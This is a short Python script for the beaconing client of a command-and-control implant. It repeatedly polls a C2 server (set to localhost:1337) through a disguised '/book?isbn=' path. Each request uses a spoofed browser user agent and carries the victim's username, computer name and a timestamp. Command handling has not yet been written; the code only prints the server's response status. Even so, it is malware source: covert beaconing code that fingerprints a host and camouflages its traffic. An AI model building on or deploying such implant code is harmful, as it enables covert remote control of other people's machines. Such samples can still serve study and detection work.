from os import getenv

from time import time, sleep
from requests import get, exceptions

HEADER = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
                        "Chrome/120.0.0.0 Safari/537.36"}
PROXY = None
PORT = 1337
C2_SERVER = "localhost"
CMD_REQUEST = "/book?isbn="
DELAY = 3
client = (getenv("USERNAME", "Unknown_Username") + "@" + getenv("COMPUTERNAME", "Unknown_Computername") + "@" +
          str(time()))

# client = getenv("LOGNAME") + "@" + uname().nodename + "@" + str(time())

while True:
    try:
        command = get(f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{client}", headers=HEADER, proxies=PROXY)
        print(command.status_code)
    except exceptions.RequestException as error:
        print(error)
        sleep(DELAY)
        continue
